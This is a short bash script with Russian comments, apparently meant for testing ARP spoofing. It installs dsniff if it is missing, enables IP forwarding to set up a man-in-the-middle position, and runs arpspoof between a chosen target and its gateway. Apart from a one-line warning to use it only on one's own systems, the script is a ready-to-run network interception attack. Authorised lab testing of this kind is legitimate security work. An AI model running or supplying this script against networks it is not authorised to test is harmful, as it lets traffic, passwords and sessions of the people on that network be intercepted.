#!/bin/bash
# Скрипт для тестирования ARP Spoofing атаки
# Использование: ./test_arp_spoofing.sh <interface> <target_ip> <gateway_ip>

INTERFACE=${1:-"eth0"}
TARGET_IP=${2:-"192.168.1.100"}
GATEWAY_IP=${3:-"192.168.1.1"}

echo "Тестирование ARP Spoofing атаки"
echo "Интерфейс: $INTERFACE"
echo "Целевой IP: $TARGET_IP"
echo "Gateway IP: $GATEWAY_IP"
echo "ВНИМАНИЕ: Это тестовая атака! Используйте только на своих системах."
echo "Нажмите Ctrl+C для остановки"
sleep 3

# Проверка наличия arpspoof
if ! command -v arpspoof &> /dev/null; then
    echo "Установка dsniff..."
    sudo apt-get install -y dsniff
fi

# Включение IP forwarding (для MITM)
echo "Включение IP forwarding..."
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

# Запуск ARP Spoofing
echo "Запуск ARP Spoofing атаки..."
sudo arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY_IP
